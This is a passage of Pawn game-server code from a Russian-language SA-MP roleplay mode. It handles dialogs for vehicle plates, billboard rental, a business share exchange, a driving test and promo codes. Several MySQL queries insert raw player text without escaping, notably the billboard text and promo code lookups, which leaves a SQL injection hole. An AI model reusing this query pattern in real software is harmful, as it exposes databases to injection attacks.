	         	case 1: ShowPlayerDialog(playerid,42,DIALOG_STYLE_INPUT,"Положить","{FFFFFF}Введите сколько наркотики хотите положить:","Далее","Назад");
	         	case 2: ShowPlayerDialog(playerid,43,DIALOG_STYLE_INPUT,"Положить","{FFFFFF}Введите сколько денег хотите положить:","Далее","Назад");
		    }
		}
		case 385:
		{
		    if(!response) return true;
		    if(PlayerInfo[playerid][pCash] < 150) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
		    new kek = 0;
			for(new v = 1; v <= TOTALV; v++)
			{
			    if(VInfo[v][vcar] == INVALID_VEHICLE_ID) continue;
				if(GetPlayerVehicleID(playerid) == VInfo[v][vcar])
				{
		  			if(strcmp(VInfo[v][vname], PlayerInfo[playerid][pSendername], true) == 0) kek = v;
				}
			}
			if(!kek) return SendClientMessage(playerid,CGREY,"Вы не в своем личном транспорте!");
			if(strcmp(VInfo[kek][vnumber], "Nope", true) == 0)
			{
			//	ShowPlayerDialog(playerid,385,DIALOG_STYLE_MSGBOX,"Зарегистрировать транспорт","{ffffff}Вы действительно хотите зарегистрировать свой транспорт?\nЦена: {f7ae11}%d$","Далее","Отмена");
			    new color1[20],color2[20];
    			sscanf(PlayerInfo[playerid][pSendername], "p<_>s[20]s[20]",color1, color2);
				new str[10];
				strdel(color1,1,sizeof(color1));
				strdel(color2,1,sizeof(color2));
				format(str,sizeof(str),"%s%s%d%d%d%d",color1,color2,(IsPlayerInRangeOfPoint(playerid, 10.0, 1542.9429,-1609.7428,14.9334)) ? (1) : (3),random(9),random(9),random(9));
	   			strmid(VInfo[kek][vnumber], str, 0, strlen(str), 10);
	   			query = "";
				format(query, sizeof(query), "UPDATE `veh` SET num = '%s' WHERE id = '%d' LIMIT 1",VInfo[kek][vnumber],VInfo[kek][id]);
				mysql_tquery(mysql,query);
				static const fmt_string1[] = "Вы зарегистрировали ваше транспортное средство! Ваш номер: {f7ae11}%s";
				new str1[sizeof(fmt_string1)+20];
				format(str1, sizeof(str1), fmt_string1,str);
				SendClientMessage(playerid,-1,str1);
				new Float:X,Float:Y,Float:Z,Float:FA;
				GiveMoney(playerid,-150);
				new Float:heal;
				new panels,doors_,lights_,tires;
				GetVehicleDamageStatus(GetPlayerVehicleID(playerid),panels,doors_,lights_,tires);
				GetVehicleHealth(GetPlayerVehicleID(playerid),heal);
				GetVehicleZAngle(GetPlayerVehicleID(playerid), FA);
				GetVehiclePos(GetPlayerVehicleID(playerid), X,Y,Z);
				DestroyVehicle(GetPlayerVehicleID(playerid));
				VInfo[kek][vcar] = CreateVehicle(VInfo[kek][vmodel],X,Y,Z,FA,VInfo[kek][vcolor1],VInfo[kek][vcolor2],-1);
				SetVehicleNumberPlate(VInfo[kek][vcar], VInfo[kek][vnumber]);
				SetVehicleToRespawn(VInfo[kek][vcar]);
				UpdateVehicleDamageStatus(VInfo[kek][vcar],panels,doors_,lights_,tires);
				SetVehicleHealth(VInfo[kek][vcar],heal);
				PutPlayerInVehicle(playerid,VInfo[kek][vcar],0);
				GetVehicleParamsEx(GetPlayerVehicleID(playerid),engine,lights,alarm,doors,bonnet,boot,objective);
				SetVehicleParamsEx(GetPlayerVehicleID(playerid),VEHICLE_PARAMS_OFF,VEHICLE_PARAMS_OFF,alarm,doors,bonnet,boot,objective);
				SetEngine(playerid,GetPlayerVehicleID(playerid),false);
				SetLights(playerid,GetPlayerVehicleID(playerid),false);
			}
			else SendClientMessage(playerid,CGREY,"У Вас уже есть номера");
		}
		case 386:
		{
		    if(!response) return ShowS(playerid);
		    if(PlayerInfo[playerid][pHod] == listitem) return SendClientMessage(playerid,CGREY,"У уже установлен данный стиль походки!");
		    PlayerInfo[playerid][pHod] = listitem;
		    static const fmt_string2[] = "Вы изменили свой стиль походки на %s";
			new str2[sizeof(fmt_string2)+24];
			format(str2, sizeof(str2), fmt_string2,Anims[listitem][aName]);
			SendClientMessage(playerid,CREWARD,str2);
		}
		case 387:
		{
           // new playername[64];
	   		if(!response) return true;
		   	SetPVarInt(playerid,"SelectBildID",listitem+1);
		   	if(!strcmp(BildInfo[listitem+1][bOwner],"None",true))
		   	{
    	 		BildIntro(playerid, listitem+1, -30);
		    	query = "";
		    	format(query, sizeof(query),"{ffffff}Вы уверены что хотите арендовать данный рекламный щит на 7 дней?\nЦена: {f7ae11}5.000$");
		       	ShowPlayerDialog(playerid,395,DIALOG_STYLE_MSGBOX,"Аренда билборда",query,"Да","Нет");
		   	}
		   	else if(strfind(PlayerInfo[playerid][pSendername],BildInfo[listitem][bOwner],false) == 0) ShowPlayerEditMenu(playerid);
		}
	  	case 388:
		{
			    if(!response) return TogglePlayerSpectating(playerid,false);
			    switch(listitem)
			    {
			        case 0: ShowPlayerDialog(playerid,389,DIALOG_STYLE_INPUT,"Редактирование текста","{ffffff}Введите текст объявления в поле ниже:","Изменить","Назад");
			        case 1:
					{
						new str[24];
						query = "";
					    for(new i, z = sizeof(Colors_LOW); i<z; i++) format(str,24,"{%s}|||||\n",Colors_LOW[i]), strcat(query, str);
						ShowPlayerDialog(playerid,390,DIALOG_STYLE_LIST,"Цвет фона",query,"Изменить","Назад");
					}
					case 2: ShowPlayerDialog(playerid,391,DIALOG_STYLE_LIST,"Шрифт","Arial\nCalibri\nTahoma\nVerdana","Выбрать","Назад");
					case 3: ShowPlayerDialog(playerid,392,DIALOG_STYLE_INPUT,"Размер текста","{ffffff}Укажите размер текста (от 1 до 255)","Выбрать","Назад");
					case 4: ShowPlayerDialog(playerid,393,DIALOG_STYLE_LIST,"Выравнивания текста","По левому краю\nПо центру\nПо правому краю","Выбрать","Назад");
			/*		case 5:
					{
						new query[256];
					    format(query, sizeof(query),"{ffffff}Введите требуемое кол-во дней:\nМаксимум дней: 7\nЦена за день: {43CD80}5000$");
	    				ShowPlayerDialog(playerid,1181,DIALOG_STYLE_INPUT,"{ffffff}Аренда",query,"Продлить","Назад");
					}*/
					case 5: ShowPlayerDialog(playerid,394,DIALOG_STYLE_MSGBOX,"Расторжение договора","{ffffff}Вы действительно хотите разорвать договор с этим билбордом?","Да","Нет");
			    }
			}
		case 389:
			{
	            if(!response) return ShowPlayerEditMenu(playerid);
	            new  p_var = GetPVarInt(playerid,"SelectBildID");
				for(new i; i<5; i++)
				{
					new pos = strfind(inputtext,"/",false);
					if(pos != -1) strdel(inputtext, pos, pos+1), strins(inputtext, "\n", pos, 2);
				}
				format(BildInfo[p_var][bText],144,inputtext);
				SendClientMessage(playerid,CREWARD,"Текст рекламного билборда успешно изменен");
				ShowPlayerEditMenu(playerid), UpdateBuildText(p_var);
                query = "";
				format(query,144+64,"UPDATE `billboards` SET `bText` = '%s' WHERE `id` = %i",inputtext,p_var);
				mysql_tquery(mysql,query);
	  		}
		case 390:
			{
	  		    if(!response) return ShowPlayerEditMenu(playerid);
	  		    new  p_var = GetPVarInt(playerid,"SelectBildID");
				BildInfo[p_var][bBackColor] = listitem;
				SendClientMessage(playerid,CREWARD,"Цвет фона рекламного билборда успешно изменен");
				ShowPlayerEditMenu(playerid), UpdateBuildText(p_var);
                query = "";
				format(query,96,"UPDATE `billboards` SET `bBackColor` = %i WHERE `id` = %i",listitem,p_var);
				mysql_tquery(mysql,query);
			}
		case 391:
			{
	            if(!response) return ShowPlayerEditMenu(playerid);
	            new  p_var = GetPVarInt(playerid,"SelectBildID");
	            BildInfo[p_var][bFontFace] = listitem;
	            SendClientMessage(playerid,CREWARD,"Шрифт текста рекламного билборда успешно изменен");
				ShowPlayerEditMenu(playerid), UpdateBuildText(p_var);
                query = "";
				format(query,96,"UPDATE `billboards` SET `bFontFace` = %i WHERE `id` = %i",listitem,p_var);
				mysql_tquery(mysql,query);
			}
		case 392:
			{
			    if(!response) return ShowPlayerEditMenu(playerid);
				new size = strval(inputtext),  p_var = GetPVarInt(playerid,"SelectBildID");
			    if(size < 0 || size > 255) return SendClientMessage(playerid,COLOR_GREY,"Минимальный размер: 0, а максимальный: 255"), ShowPlayerDialog(playerid,392,DIALOG_STYLE_INPUT,"Размер текста","{ffffff}Укажите размер текста (от 1 до 255)","Готово","Назад");
			    BildInfo[p_var][bFontSize] = size;
			    SendClientMessage(playerid,CREWARD,"Размер текста рекламного билборда успешно изменен");
			    ShowPlayerEditMenu(playerid), UpdateBuildText(p_var);
                query = "";
			    format(query,96,"UPDATE `billboards` SET `bFontSize` = %i WHERE `id` = %i",size,p_var);
				mysql_tquery(mysql,query);
			}
		case 393:
			{
			    if(!response) return ShowPlayerEditMenu(playerid);
			    new  p_var = GetPVarInt(playerid,"SelectBildID");
			    BildInfo[p_var][bAligment] = listitem;
			    SendClientMessage(playerid,CREWARD,"Выравнивание текста рекламного билборда успешно изменено");
			    ShowPlayerEditMenu(playerid), UpdateBuildText(p_var);
                query = "";
				format(query,96,"UPDATE `billboards` SET `bAligment` = %i WHERE `id` = %i",listitem,p_var);
				mysql_tquery(mysql,query);
			}
		case 394:
			{
			    if(!response) return ShowPlayerEditMenu(playerid);
			    new  p_var = GetPVarInt(playerid,"SelectBildID");
			    BildInfo[p_var][bFontSize] = 0;
			    BildInfo[p_var][bBackColor] = 0;
				BildInfo[p_var][bFontFace] = 0;
				BildInfo[p_var][bDay] = 0;
				format(BildInfo[p_var][bOwner],1,"-");
			    SendClientMessage(playerid,CREWARD,"Вы разорвали договор с одним из рекламных билбордов");
			    UpdateBuildText(p_var);
	            TogglePlayerSpectating(playerid,false);
                query = "";
			    format(query, sizeof(query), "UPDATE `billboards` SET `bDay` = 0, `bOwner` = '-', `bText` = '-', `bFontSize` = 25, `bAligment` = 1, `bBackColor` = 1, `bFontFace` = 0 WHERE `id` = %i",p_var);
				mysql_tquery(mysql,query);
			}
  		 case 395:
		{
		    if(!response) return TogglePlayerSpectating(playerid,false);
		    new p_var = GetPVarInt(playerid,"SelectBildID");
		    if(PlayerInfo[playerid][pCash] < 5000) return SendClientMessage(playerid,CGREY,"Недостаточно средств"), TogglePlayerSpectating(playerid,false), true;
			GiveMoney(playerid,-5000);
			format(BildInfo[p_var][bOwner],MAX_PLAYER_NAME,PlayerInfo[playerid][pSendername]);
			SendClientMessage(playerid,CREWARD,"Вы взяли в аренду рекламный билборд на 7 дней");
			SendClientMessage(playerid, CREWARD, "Воспользуйтесь меню для установки или изменения параметров Вашей рекламы");
			ShowPlayerEditMenu(playerid);
			BildInfo[p_var][bDay] = gettime()+60*60*24*7;
			query = "";
			format(query,sizeof(query),"UPDATE `billboards` SET `bDay` = %d, `bOwner` = '%s' WHERE `id` = '%i'",BildInfo[p_var][bDay],PlayerInfo[playerid][pSendername],p_var);
			mysql_tquery(mysql,query);
		}
		case 396:
		{
		    if(!response) return RemovePlayerFromVehicle(playerid);
		    switch(listitem)
		    {
		        case 0: BuyCar(playerid,0);
		        case 1:
		        {
					query = "";
					format(query, sizeof(query), "SELECT * FROM veh WHERE fam = '%d'", PlayerInfo[playerid][pFam]);
					mysql_tquery(mysql, query, "ColVeh", "d", playerid);
		        }
		    }
		}
		//ShowPlayerDialog(playerid,397,DIALOG_STYLE_LIST,"Биржа","Ваши акции\nСтатистика акций\nВыставить акции бизнеса на продажу","Далее","Отмена");
		case 397:
		{
		    if(!response) return 1;
		    query = "";
			new str[100];
		    switch(listitem)
		    {
		        case 0:
		        {
		            new kek;
		            for(new i = 1; i <= TOTALBIZ; i++)
		            {
						if(!BizInfo[i][bAkc]) continue;
		                format(str,sizeof(str),"%d | %s (%s)\tЦена: %d$\tДоступно: %d%%\n",kek+1,BizInfo[i][bName],RaionName(GetRaion(BizInfo[i][bX],BizInfo[i][bY])),BizInfo[i][bAkcP],BizInfo[i][bAkc]);
                        strcat(query,str);
						ListNick[playerid][kek] = i;
						kek++;
				    }
		            if(!kek) return ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Купить акции","{ffffff}Нет акций на продаже","Далее","");
		            ShowPlayerDialog(playerid,403,DIALOG_STYLE_TABLIST,"Купить акции",query,"Далее","Отмена");
		        }
		        case 1:
		        {

		            for(new i = 0; i < 5; i++)
		            {
						if(!PlayerInfo[playerid][pBizA][i]) continue;
		                format(str,sizeof(str),"%d | %s (%s)\t%d%%\n",i+1,BizInfo[PlayerInfo[playerid][pBizA][i]][bName],RaionName(GetRaion(BizInfo[PlayerInfo[playerid][pBizA][i]][bX],BizInfo[PlayerInfo[playerid][pBizA][i]][bY])),PlayerInfo[playerid][pBizAC][i]);
                        strcat(query,str);
					}
		            if(!strlen(str)) return ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Ваши акции","{ffffff}У Вас нет акций","Далее","");
		            ShowPlayerDialog(playerid,398,DIALOG_STYLE_LIST,"Ваши акции",query,"Далее","Отмена");
		        }
		        case 2:
		        {
		            if(!GetPlayerBiz(playerid)) return SendClientMessage(playerid,CGREY,"Вы не владете бизнесом!");
		            ShowPlayerDialog(playerid,407,DIALOG_STYLE_INPUT,"Выставить на продажу","{ffffff}Введите количество акций, которое хотите выставить на продажу и цену за 1% акций через запятую:\n\nНапример: 15,100\n\n{F85A5A}- Максимальное количество акций на продаже 15%","Далее","Отмена");
		        }
		    }
		}
		case 398:
		{
		    if(!response) return 1;
		    query = "";
			format(query,sizeof(query),"{ffffff}Название:\t\t{f7ae11}%s\n{ffffff}Район:\t\t\t{f7ae11}%s\n{ffffff}Количество акций:\t{f7ae11}%d%%\n{ffffff}Цена акции:\t\t{f7ae11}%d$\n{ffffff}",
			BizInfo[PlayerInfo[playerid][pBizA][listitem]][bName],RaionName(GetRaion(BizInfo[PlayerInfo[playerid][pBizA][listitem]][bX],BizInfo[PlayerInfo[playerid][pBizA][listitem]][bY])),
			PlayerInfo[playerid][pBizAC][listitem],BizInfo[PlayerInfo[playerid][pBizA][listitem]][bAkcP]);
            
			ShowPlayerDialog(playerid,399,DIALOG_STYLE_MSGBOX,BizInfo[PlayerInfo[playerid][pBizA][listitem]][bName],query,"Далее","Отмена");
	
		    SetPVarInt(playerid,"BizA",listitem);
		    
		}
		case 399:
		{
		    if(!response) return 1;
		    new i = GetPVarInt(playerid,"BizA");
		    ShowPlayerDialog(playerid,400,DIALOG_STYLE_LIST,BizInfo[PlayerInfo[playerid][pBizA][i]][bName],"1 | Подробная статистика\n2 | Продать акции","Далее","Отмена");
		}
		case 400:
		{
		    if(!response) return 1;
		    new i = GetPVarInt(playerid,"BizA");
		    switch(listitem)
		    {
		        case 0:
		        {
		            query = "";
		            format(query, sizeof(query), "SELECT * FROM bizpay WHERE bizid = '%d' ORDER BY vrem DESC LIMIT 15 ", PlayerInfo[playerid][pBizA][i]);
					mysql_tquery(mysql, query, "ShowBizStats", "dd", playerid,i);
					
					
				/*	format(query, sizeof(query), "SELECT * FROM bizpay WHERE bizid = '%d' ORDER BY vrem DESC LIMIT 15 ", PlayerInfo[playerid][pBizA][i]);
					mysql_tquery(mysql,query);
					mysql_store_result();
					new date[20],money[10],stat[20];
					if(mysql_num_rows() > 0)
					{
					    new str[100];
					    new srrt[400];
						strcat(srrt, "{FFFFFF}Дата\tДоход\tПрибыль\tИзменение\n\n");
						for(new x = 1; x <= mysql_num_rows();x++)
						{
							mysql_fetch_row(query);

							mysql_get_field("date", date);
                            mysql_get_field("money", money);
                            mysql_get_field("stat", stat);
							format(str,sizeof(str),"%s\t%d$\t\t\t%d$\t\t%s{ffffff}\n",date,strval(money),strval(money)*PlayerInfo[playerid][pBizAC][i]/100,stat);
							strcat(srrt, str); //("{F85A5A}[Выключена]{FFFFFF}") : ("{20BA09}[Включена]{FFFFFF}")
						}
						mysql_free_result();
						ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Статистика за 15 дней",srrt,"Закрыть","");
					}*/
		        }
		        case 1:
		        {
		            ShowPlayerDialog(playerid,401,DIALOG_STYLE_INPUT,BizInfo[PlayerInfo[playerid][pBizA][i]][bName],"{ffffff}Введите ID игрока, количество акций, цену через запятую:\n\nНапример: 50,1,100","Далее","Отмена");
		        }
		    }
		}
		case 401:
		{
		    if(!response) return 1;
		    new i = GetPVarInt(playerid,"BizA");
		    new player,kolvo,cena;
		    if(sscanf(inputtext,"p<,>ddd",player,kolvo,cena)) return ShowPlayerDialog(playerid,401,DIALOG_STYLE_INPUT,BizInfo[PlayerInfo[playerid][pBizA][i]][bName],"{ffffff}Введите ID игрока, количество акций, цену через запятую:\n\nНапример: 50,1,100","Далее","Отмена");
            if(!IsPlayerConnected(player) || PlayerLogged[player] == false || player == playerid) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
		    new Float:x,Float:y,Float:z;
		    GetPlayerPos(player,x,y,z);
		    if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
		    if(cena < 1 || cena > 10000000) return SendClientMessage(playerid,CGREY,"Вы не можете продать меньше чем за $1");
			
			static const fmt_string2[] = "{FFFFFF}Вы действительно хотите продать акции игроку?\nВы получите:{f7ae11}\n$%i{FFFFFF}\nОтдадите:\n{f7ae11}%d%% акций %s";
			new str2[sizeof(fmt_string2)+32+10];
			format(str2, sizeof(str2), fmt_string2,cena,kolvo,BizInfo[PlayerInfo[playerid][pBizA][i]][bName]);
			ShowPlayerDialog(playerid,406,DIALOG_STYLE_MSGBOX,"Продажа акций",str2,"Да","Нет");
		}
		case 403:
		{
		    if(!response) return 1;
			SetPVarInt(playerid,"AcBuy",ListNick[playerid][listitem]);
			ShowPlayerDialog(playerid,404,DIALOG_STYLE_INPUT,"Покупка акций","{ffffff}Введите сколько акций вы хотите приобрести:\n\n","Далее","Отмена");
		}
		case 404:
		{
		    if(!response) return DeletePVar(playerid,"AcBuy");
		    if(!strlen(inputtext)) return ShowPlayerDialog(playerid,404,DIALOG_STYLE_INPUT,"Покупка акций","{ffffff}Введите сколько акций вы хотите приобрести:\n\n","Далее","Отмена");
			new kolvo = strval(inputtext), i = GetPVarInt(playerid,"AcBuy");
			if(kolvo > BizInfo[i][bAkcP])
			{
				SendClientMessage(playerid,CGREY,"Недостаточно акций на бирже!");
			    return DeletePVar(playerid,"AcBuy");
			}
			SetPVarInt(playerid,"AcKol",kolvo);
			query = "";
			format(query,sizeof(query),"{ffffff}Название:\t\t{f7ae11}%s\n{ffffff}Район:\t\t\t{f7ae11}%s\n{ffffff}Количество акций:\t{f7ae11}%d%%\n{ffffff}Цена акции:\t\t{f7ae11}%d$\n{ffffff}\n\nВы действительно хотите купить данную акцию?\nЦена за %d%% акций: {f7ae11}%d$\n{ffffff}Комиссия: {f7ae11}%d%%{ffffff}\nЦена с комиссией: {f7ae11}%d$",
			BizInfo[i][bName],RaionName(GetRaion(BizInfo[i][bX],BizInfo[i][bY])),
			BizInfo[i][bAkc],BizInfo[i][bAkcP],kolvo,BizInfo[i][bAkcP]*kolvo,Birga,BizInfo[i][bAkcP]*kolvo+(BizInfo[i][bAkcP]*kolvo)*Birga/100);
            
			ShowPlayerDialog(playerid,405,DIALOG_STYLE_MSGBOX,BizInfo[i][bName],query,"Далее","Отмена");
		}
		case 405:
		{
		    if(!response)
			{
			    DeletePVar(playerid,"AcKol");
				return DeletePVar(playerid,"AcBuy");
			}
			new kolvo = GetPVarInt(playerid,"AcKol"), i = GetPVarInt(playerid,"AcBuy");
			if(kolvo > BizInfo[i][bAkc])
			{
				SendClientMessage(playerid,CGREY,"Недостаточно акций на бирже!");
				DeletePVar(playerid,"AcKol");
			    return DeletePVar(playerid,"AcBuy");
			}
			if(PlayerInfo[playerid][pBank] < BizInfo[i][bAkcP]*kolvo+(BizInfo[i][bAkcP]*kolvo)*Birga/100)
			{
			    SendClientMessage(playerid,CGREY,"Недостаточно денег в банке!");
				DeletePVar(playerid,"AcKol");
			    return DeletePVar(playerid,"AcBuy");
			}
			BizInfo[i][bAkc] -= kolvo;
			GiveMoney(playerid,-BizInfo[i][bAkcP]*kolvo+(BizInfo[i][bAkcP]*kolvo)*Birga/100);
			BizInfo[i][bMoney] += (BizInfo[i][bAkcP]*kolvo)-(BizInfo[i][bAkcP]*kolvo)*Perevod/100;
			SetBizInt(i,"money",BizInfo[i][bMoney]);
			SetBizInt(i,"bAkc",BizInfo[i][bAkc]);
			for(new x = 0; x < 5; x++)
			{
			    if(PlayerInfo[playerid][pBizA][x] && PlayerInfo[playerid][pBizA][x] != i) continue;
			    PlayerInfo[playerid][pBizA][x] = i;
			    PlayerInfo[playerid][pBizAC][x] = kolvo;
			    break;
			}
			static const fmt_string2[] = "[БИРЖА]{FFFFFF} Вы приобрели %d%% акций %s";
			new str2[sizeof(fmt_string2)+32+10];
			format(str2, sizeof(str2), fmt_string2,kolvo,BizInfo[i][bName]);
			SendClientMessage(playerid,CREWARD,str2);
			
		}
		case 406:
		{
		    if(!response) return 1;
		    SendClientMessage(playerid,CREWARD,"Вы предложили игроку купить акции");
		    if(GetPred(GetPVarInt(playerid,"AcID1")) == 1) return SendClientMessage(playerid,CGREY,"Игроку уже кто-то что-то предложил");
   			static const fmt_string1[] = "%s предложил Вам %d%% акций %s. Цена: $%i";
			new str1[sizeof(fmt_string1)+32+10+32];
			format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],GetPVarInt(playerid,"AcKolvo1"),GetPVarInt(playerid,"AcBiz1"),GetPVarInt(playerid,"AcCena1"));
			SendClientMessage(GetPVarInt(playerid,"AcID1"),0xFF7F50FF,str1);
			SendClientMessage(GetPVarInt(playerid,"AcID1"),CWHITE,"Для согласия нажмите{FF7F50} [Y]{FFFFFF} ,для отказа нажмите {FF7F50}[N]");
			SetPVarInt(GetPVarInt(playerid,"AcID1"),"AcID",playerid);
			SetPVarInt(GetPVarInt(playerid,"AcID1"),"AcCena",GetPVarInt(playerid,"AcCena1"));
			SetPVarInt(GetPVarInt(playerid,"AcID1"),"AcKolvo1",GetPVarInt(playerid,"AcKolvo"));
			SetPVarInt(GetPVarInt(playerid,"AcID1"),"AcBiz1",GetPVarInt(playerid,"AcBiz"));
   			DeletePVar(playerid,"AcID1");
      		DeletePVar(playerid,"AcCena1");
      		DeletePVar(playerid,"AcKolvo1");
      		DeletePVar(playerid,"AcBiz1");
		}
		case 407:
		{
		    if(!response) return 1;
            new kolvo,cena, i = GetPVarInt(playerid,"PlayerBiz");
		    if(sscanf(inputtext,"p<,>dd",kolvo,cena) || cena < 1 || kolvo < 1) return ShowPlayerDialog(playerid,407,DIALOG_STYLE_INPUT,"Выставить на продажу","{ffffff}Введите количество акций, которое хотите выставить на продажу и цену за 1% акций через запятую:\n\nНапример: 15,100\n\n{F85A5A}- Максимальное количество акций на продаже 15%","Далее","Отмена");
		    if(kolvo+BizInfo[i][bAkcAll] > 15)
			{
			    static const fmt_string1[] = "На биржу можно выставить не более 15%% акций! Доступно для продажи: %d%%";
				new str1[sizeof(fmt_string1)+3];
				format(str1, sizeof(str1), fmt_string1,15-BizInfo[i][bAkcAll]);
				return SendClientMessage(playerid,CGREY,str1);
			}
            BizInfo[i][bAkcAll] += kolvo;
            BizInfo[i][bAkc] += kolvo;
            BizInfo[i][bAkcP] = cena;
            SetBizInt(i,"bAkcAll",BizInfo[i][bAkcAll]);
			SetBizInt(i,"bAkcP",BizInfo[i][bAkcP]);
			SetBizInt(i,"bAkc",BizInfo[i][bAkc]);
            static const fmt_string2[] = "[БИРЖА]{FFFFFF} Вы выставили на продажу %d%% акций по %d$";
			new str2[sizeof(fmt_string2)+32+10];
			format(str2, sizeof(str2), fmt_string2,kolvo,cena);
			SendClientMessage(playerid,CREWARD,str2);
			SendClientMessage(playerid,CREWARD,"[БИРЖА]{FFFFFF} Цена на акции, выставленные ранее изменилась!");
            
		}
		case 408:
		{
			if(!response) return DeletePVar(playerid,"PDD");
			if(GetPVarInt(playerid,"PDD")) ShowPlayerDialog(playerid,409,DIALOG_STYLE_INPUT,"Вопрос",TextVop[GetPVarInt(playerid,"Vopros")],"Далее","Отмена");
			else
			{
			    query = "";
			    format(query,sizeof(query),"%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",PDD[18],PDD[19],PDD[20],PDD[21]
			    ,PDD[22],PDD[23],PDD[24],PDD[25],PDD[26],PDD[27],PDD[28],PDD[29],PDD[30],PDD[31]
			    ,PDD[32],PDD[33],PDD[34],PDD[35],PDD[36],PDD[37],PDD[38],PDD[39],PDD[40],PDD[41],PDD[42],PDD[43]);
				ShowPlayerDialog(playerid,408,DIALOG_STYLE_MSGBOX,"Теория",query,"Далее","Отмена");
				SetPVarInt(playerid,"PDD",1);
			}

		}
		case 409:
		{
			if(!response)
			{
			    SendClientMessage(playerid,CREWARD,"Вы закончили тестирование!");
			    DeletePVar(playerid,"Vopros1");
				return DeletePVar(playerid,"Vopros");
			}
			if(!strlen(inputtext)) return ShowPlayerDialog(playerid,491,DIALOG_STYLE_INPUT,"Вопрос",TextVop[GetPVarInt(playerid,"Vopros")],"Далее","Отмена");
			if(strval(inputtext) < 1 || strval(inputtext) > Vopros[GetPVarInt(playerid,"Vopros")][0]) return ShowPlayerDialog(playerid,409,DIALOG_STYLE_INPUT,"Вопрос",TextVop[GetPVarInt(playerid,"Vopros")],"Далее","Отмена");
			if(strval(inputtext) == Vopros[GetPVarInt(playerid,"Vopros")][1]) SetPVarInt(playerid,"Vopros1",GetPVarInt(playerid,"Vopros1")+1);
		    SetPVarInt(playerid,"Vopros",GetPVarInt(playerid,"Vopros")+1);
		    if(GetPVarInt(playerid,"Vopros") < 6) ShowPlayerDialog(playerid,409,DIALOG_STYLE_INPUT,"Вопрос",TextVop[GetPVarInt(playerid,"Vopros")],"Далее","Отмена");
		    else
		    {
		        if(GetPVarInt(playerid,"Vopros1") > 3)
		        {
					SendClientMessage(playerid,CREWARD,"Вы успешно прошли тестирование!");
					SendClientMessage(playerid,CREWARD,"Пройдите к боту для прохождения практического тестирования!");
					PlayerInfo[playerid][pTest] = 1;
				    DeletePVar(playerid,"Vopros1");
					DeletePVar(playerid,"Vopros");
		        }
		        else
		        {
					SendClientMessage(playerid,CREWARD,"Вы провалили тестирование!");
				    DeletePVar(playerid,"Vopros1");
					DeletePVar(playerid,"Vopros");
		        }
		    }
		}
		case 410:
		{
		    if(!response) return 1;
		    if(!listitem) return ShowPlayerDialog(playerid,411,DIALOG_STYLE_INPUT,"Создание промокода","{ffffff}Введите промокод и тип промокода через запятую:\nНапример: Maryland,1","Далее","Отмена");
		}
		case 411:
		{
		    if(!response) return 1;
		    new code[10],type;
		    if(sscanf(inputtext,"p<,>s[10]d",code,type) || strlen(code) > 10 || type > 3 || type < 1) return ShowPlayerDialog(playerid,411,DIALOG_STYLE_INPUT,"Создание промокода","{ffffff}Введите промокод и тип (1-3) промокода через запятую:\n\nНапример: Maryland,1","Далее","Отмена");
            query = "";
			format(query,512,"INSERT INTO code (code,type)\
			VALUES ('%s','%d')",
			code,type);
			mysql_tquery(mysql,query);
			static const fmt_string2[] = "Вы создали промокод %s с типом %d";
			new str2[sizeof(fmt_string2)+10];
			format(str2, sizeof(str2), fmt_string2,code,type);
			SendClientMessage(playerid,CREWARD,str2);
		}
		case 412:
		{
		    if(!response) return 1;
			if(!strlen(inputtext)) return ShowPlayerDialog(playerid,412,DIALOG_STYLE_INPUT,"Промокод","{ffffff}Введите промокод:\n","Далее","Отмена");
			query = "";
			format(query, sizeof(query), "SELECT * FROM `code` WHERE `code` = '%s' LIMIT 1",inputtext);
			mysql_tquery(mysql, query, "CheckPromo", "ds", playerid,inputtext);
			
			
  			/*format(query, sizeof(query), "SELECT * FROM `code` WHERE `code` = '%s' LIMIT 1",inputtext);
			mysql_tquery(mysql,query);
			mysql_store_result();
			new var[10],vvod[10];
			if(mysql_fetch_row_format(query))
			{
				mysql_get_field("type", var);
				mysql_get_field("vvod", vvod);
				switch(strval(var))
				{
					case 1: ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Промокод","{ffffff}Вы успешно активировали {f7ae11}промокод!{ffffff}\n\n\
					1. С 1 по 2 уровень Вы будете получать\n\
					{f7ae11}двойной опыт.{ffffff}\n\n\
					2. Со 2 по 3 уровень будет действовать\n\
					{f7ae11}тройной опыт.{ffffff}\n\n\
					3. При достижении 3 уровня Вы получите\n\
					{f7ae11}50000${ffffff}, и прокачанные на 65% навыки\n\
					впадения {f7ae11}Deagle, M4 и Shotgun.{ffffff}","Далее","");
					case 2: ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Промокод","{ffffff}Вы успешно активировали {f7ae11}промокод!{ffffff}\n\n\
					1. При достижении 3 уровня Вы\n\
					получите {f7ae11}50000$.{ffffff}\n\n\
					2. Вам выдадут ещё {f7ae11}80000$,{ffffff} если Вы\n\
					дойдёте до 6 уровня.\n\
					3. С 6 по 9 уровень Вы будете получать\n\
					{f7ae11}двойной опыт.{ffffff}","Далее","");
					case 3: ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Промокод","{ffffff}Вы успешно активировали {f7ae11}промокод!{ffffff}\n\n\
					1. При достижении 2 уровня Вы\n\
					получите {f7ae11}40000$.{ffffff}\n\n\
					2. С 5 по 7 уровень Вы будете получать\n\
					{f7ae11}тройной опыт.{ffffff}\n\
					3. Вам выдадут ещё {f7ae11}80000$,{ffffff} если Вы\n\
					дойдёте до 9 уровня.","Далее","");

				}
				PlayerInfo[playerid][pCode] = strval(var);
				format(query,sizeof(query),"UPDATE `code` SET `vvod` = '%d' WHERE code = '%s' LIMIT 1",strval(vvod)+1,inputtext);
				mysql_tquery(mysql,query);
			}
			else
			{
			    ShowPlayerDialog(playerid,412,DIALOG_STYLE_INPUT,"Промокод","{ffffff}Введите промокод:\n","Далее","Отмена");
			    return SendClientMessage(playerid,CGREY,"Неверный промокод!");
			}*/
		
		}
		case 413:
		{
		    if(!response) return 1;
